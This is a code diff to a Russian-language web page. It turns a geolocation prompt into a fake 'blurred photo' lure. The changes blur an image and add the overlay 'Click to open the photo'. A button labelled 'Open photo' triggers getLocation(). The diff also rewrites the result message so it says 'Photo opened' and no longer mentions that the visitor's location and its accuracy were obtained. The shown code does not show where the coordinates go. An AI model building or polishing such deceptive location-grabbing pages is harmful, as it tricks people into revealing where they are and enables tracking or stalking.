@@ -18,10 +18,32 @@ padding:20px;
 max-width:600px;
 margin:auto;
 }
-img{
+.photo{
+position:relative;
+overflow:hidden;
+border-radius:18px;
+}
+.photo img{
 width:100%;
-border-radius:15px;
 display:block;
+filter:blur(4px);
+opacity:.65;
+transform:scale(1.03);
+}
+.photo:after{
+content:"";
+position:absolute;
+inset:0;
+background:rgba(0,0,0,.18);
+}
+.text{
+position:absolute;
+z-index:2;
+top:50%;
+left:50%;
+transform:translate(-50%,-50%);
+font-size:20px;
+font-weight:bold;
 }
 button{
 width:100%;
@@ -35,7 +57,6 @@ font-size:18px;
 }
 #result{
 margin-top:20px;
-font-size:16px;
 }
 a{
 color:#fff;
@@ -44,11 +65,15 @@ color:#fff;
 </head>
 
 <body>
+
 <div class="container">
 
 <h2>📷 Фото</h2>
 
+<div class="photo">
 <img src="https://images.unsplash.com/photo-1500534623283-312aade485b7?auto=format&fit=crop&w=1000&q=80">
+<div class="text">Нажмите, чтобы открыть фото</div>
+</div>
 
 <button onclick="getLocation()">📍 Открыть фото</button>
 
@@ -79,8 +104,7 @@ const accuracy=Math.round(position.coords.accuracy);
 const map="https://www.google.com/maps?q="+lat+","+lon;
 
 result.innerHTML=
-"✅ Местоположение получено<br><br>"+
-"Точность: примерно "+accuracy+" м<br><br>"+
+"✅ Фото открыто<br><br>"+
 "<a href='"+map+"' target='_blank'>🗺 Открыть карту</a>";
 
 },
